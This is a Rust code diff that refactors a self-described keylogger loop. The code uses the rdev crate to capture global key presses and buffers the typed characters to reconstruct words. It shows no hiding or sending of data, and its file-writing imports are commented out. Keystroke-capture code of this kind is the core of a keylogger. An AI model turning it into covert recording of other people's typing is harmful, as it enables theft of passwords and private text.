@@ -1,7 +1,11 @@
 use std::collections::BTreeMap;
 //use std::fs::OpenOptions;
 //use std::io::Write;
-use rdev::{EventType::*, Key::*};
+use rdev::{
+    Event,
+    EventType::{self, *},
+    Key::*,
+};
 
 /// Keylogger loop
 pub fn log_keys() {
@@ -62,17 +66,17 @@ pub fn log_keys() {
                     }
                     _ if mod_pressed => {
                         println!("[pressed while mod] event: {:?}", event);
-                        add_key_to_buffer(format!("{:?}", key_pressed), &mut key_buffer, cursor_pos);
+                        add_key_to_buffer(& event, &mut key_buffer, cursor_pos);
                         println!("logged not covered key {:?}", key_pressed);
                     },
                     _ /* if !mod_pressed*/ => {
                         println!("[pressed while NO mod] event: {:?}", event);
-                        if let Some(keycode) = event.name {
+                        if let Some(keycode) = &event.name {
                             // add letters to the buffer, as we want to record words!
                             if keycode.bytes().last() < Some(127_u8)
                                 && keycode.bytes().last() > Some(31_u8)
                             {
-                                add_key_to_buffer(keycode, &mut key_buffer, cursor_pos);
+                                add_key_to_buffer(&event, &mut key_buffer, cursor_pos);
                                 cursor_pos += 1;
                             } else {
                                 // TODO handel alt, etc
@@ -122,6 +126,25 @@ fn flush_buffer(
     log_sequence(words, sequence);
 }
 
-fn add_key_to_buffer(key: String, buffer: &mut Vec<String>, pos: usize) {
-    buffer.insert(pos, key);
+fn add_key_to_buffer(event: &Event, buffer: &mut Vec<String>, pos: usize) {
+    let key_name = match &event.name {
+        None => get_key_from_event_type(event.event_type),
+        Some(empty_string) if empty_string.is_empty() => get_key_from_event_type(event.event_type),
+        Some(blank) if blank == " " => get_key_from_event_type(event.event_type),
+        Some(keycode)
+            if (keycode.bytes().last() < Some(127_u8) && keycode.bytes().last() > Some(31_u8)) =>
+        {
+            // adding letters
+            keycode.to_owned()
+        }
+        Some(_) => get_key_from_event_type(event.event_type),
+    };
+    buffer.insert(pos, key_name);
+}
+
+fn get_key_from_event_type(event_type: EventType) -> String {
+    match event_type {
+        KeyPress(key) | KeyRelease(key) => format!("{:?}", key),
+        _ => panic!("not a key event! {:?}", event_type),
+    }
 }
